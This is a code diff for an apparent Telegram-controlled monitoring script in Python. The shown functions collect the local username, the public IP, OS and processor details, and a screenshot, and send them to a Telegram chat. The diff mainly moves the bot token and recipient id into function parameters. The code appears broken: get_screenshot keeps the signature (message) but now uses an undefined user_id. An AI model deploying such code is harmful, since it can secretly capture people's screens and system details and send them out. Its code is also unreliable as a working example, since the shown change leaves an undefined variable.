@@ -3,18 +3,15 @@ import telebot as tb
 import mss
 import mss.tools
 
-tb_token = 'token here'
-bot = tb.TeleBot(tb_token)
 
-
-def pc_info(message):
+def pc_info(message, user_id, bot):
     username = os.getlogin()
     r = requests.get('https://ip.42.pl/raw')
     user_ip = r.text
     system_name = platform.platform()
     processor = platform.processor()
     os_version = platform.version()
-    bot.send_message(message.from_user.id,
+    bot.send_message(user_id,
                      "Name: " + username
                      + "\nIP: " + user_ip
                      + "\nOS: " + system_name
@@ -27,4 +24,4 @@ def get_screenshot(message):
         monitor = sct.monitors[1]  # Use the 1st monitor
         im = sct.grab(monitor)  # Grab the picture
         raw_screenshot = mss.tools.to_png(im.rgb, im.size)
-        bot.send_photo(message.from_user.id, raw_screenshot)
+        bot.send_photo(user_id, raw_screenshot)
